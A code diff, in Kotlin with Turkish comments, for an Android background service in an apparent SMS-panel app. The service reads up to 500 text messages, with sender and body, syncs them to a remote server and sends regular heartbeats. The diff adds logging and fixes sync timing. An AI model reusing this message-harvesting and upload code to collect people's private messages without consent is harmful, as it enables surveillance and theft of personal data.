@@ -18,6 +18,8 @@ import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.IOException
+import java.text.SimpleDateFormat
+import java.util.*
 import java.util.concurrent.TimeUnit
 
 class SMSBackgroundService : Service() {
@@ -32,7 +34,7 @@ class SMSBackgroundService : Service() {
     companion object {
         private const val NOTIFICATION_ID = 1001
         private const val CHANNEL_ID = "sms_panel_channel"
-        private const val HEARTBEAT_INTERVAL = 5 * 60 * 1000L // 5 dakika
+        private const val HEARTBEAT_INTERVAL = 30 * 1000L // 30 saniye (test için)
         private const val SYNC_INTERVAL = 15 * 60 * 1000L // 15 dakika
     }
 
@@ -45,6 +47,15 @@ class SMSBackgroundService : Service() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         startForeground(NOTIFICATION_ID, createNotification())
 
+        ActivityLogger.info(this, "BackgroundService", "🚀 Arka plan servisi başlatıldı", "Heartbeat: 30sn, Sync: 15dk")
+
+        // İlk heartbeat'i hemen gönder
+        scope.launch {
+            delay(2000) // 2 saniye bekle
+            sendHeartbeat()
+        }
+
+        // Periyodik heartbeat başlat
         startHeartbeat()
         startPeriodicSync()
 
@@ -103,8 +114,8 @@ class SMSBackgroundService : Service() {
         heartbeatJob?.cancel()
         heartbeatJob = scope.launch {
             while (isActive) {
+                delay(HEARTBEAT_INTERVAL) // 30 saniye bekle
                 sendHeartbeat()
-                delay(HEARTBEAT_INTERVAL)
             }
         }
     }
@@ -244,12 +255,21 @@ class SMSBackgroundService : Service() {
                         val synced = (result["synced"] as? Double)?.toInt() ?: 0
                         val duplicates = (result["duplicates"] as? Double)?.toInt() ?: 0
 
+                        // ÖNEMLI: lastSyncTimestamp'i okunan mesajların en son timestamp'ine ayarla
+                        // Böylece bir sonraki sync'te sadece YENİ mesajları okur
+                        val newLastSyncTime = if (messages.isNotEmpty()) {
+                            // En son mesajın timestamp'ini al
+                            messages.maxOfOrNull { (it["timestamp"] as? Long) ?: 0L } ?: System.currentTimeMillis()
+                        } else {
+                            System.currentTimeMillis()
+                        }
+
                         // İstatistikleri güncelle
                         val totalSynced = prefs.getInt("syncedSms", 0) + synced
                         prefs.edit()
                             .putInt("syncedSms", totalSynced)
                             .putLong("lastSync", System.currentTimeMillis())
-                            .putLong("lastSyncTimestamp", System.currentTimeMillis())
+                            .putLong("lastSyncTimestamp", newLastSyncTime) // ÖNCEKİ hatalıydı!
                             .apply()
 
                         val resultMsg = if (duplicates > 0) {
@@ -326,7 +346,27 @@ class SMSBackgroundService : Service() {
         val sortOrder = "${Telephony.Sms.DATE} DESC LIMIT 500"
 
         try {
+            ActivityLogger.info(
+                this,
+                "BackgroundService",
+                "📖 SMS veritabanı okunuyor...",
+                if (sinceTimestamp > 0) {
+                    val dateFormat = SimpleDateFormat("HH:mm:ss dd/MM", Locale.getDefault())
+                    "Filtre: ${dateFormat.format(Date(sinceTimestamp))} sonrası"
+                } else {
+                    "Filtre: TÜM SMS'ler (ilk sync)"
+                }
+            )
+
             contentResolver.query(uri, projection, selection, selectionArgs, sortOrder)?.use { cursor ->
+                val totalInCursor = cursor.count
+                ActivityLogger.info(
+                    this,
+                    "BackgroundService",
+                    "Cursor'da $totalInCursor SMS bulundu",
+                    "Okunuyor..."
+                )
+
                 while (cursor.moveToNext()) {
                     val address = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)) ?: continue
                     val body = cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)) ?: ""
@@ -349,6 +389,18 @@ class SMSBackgroundService : Service() {
                         "timestamp" to date
                     ))
                 }
+
+                ActivityLogger.success(
+                    this,
+                    "BackgroundService",
+                    "✓ ${messages.size} SMS başarıyla okundu",
+                    if (messages.isNotEmpty()) {
+                        val oldest = messages.minOfOrNull { (it["timestamp"] as? Long) ?: 0L } ?: 0L
+                        val newest = messages.maxOfOrNull { (it["timestamp"] as? Long) ?: 0L } ?: 0L
+                        val dateFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
+                        "Aralık: ${dateFormat.format(Date(oldest))} - ${dateFormat.format(Date(newest))}"
+                    } else null
+                )
             }
 
             // Toplam SMS sayısını güncelle
@@ -356,7 +408,13 @@ class SMSBackgroundService : Service() {
             prefs.edit().putInt("totalSms", totalCount).apply()
 
         } catch (e: Exception) {
-            android.util.Log.e("SMSPanel", "SMS okuma hatası: ${e.message}")
+            ActivityLogger.error(
+                this,
+                "BackgroundService",
+                "SMS okuma hatası!",
+                "${e.javaClass.simpleName}: ${e.message}"
+            )
+            android.util.Log.e("SMSPanel", "SMS okuma hatası", e)
         }
 
         return messages
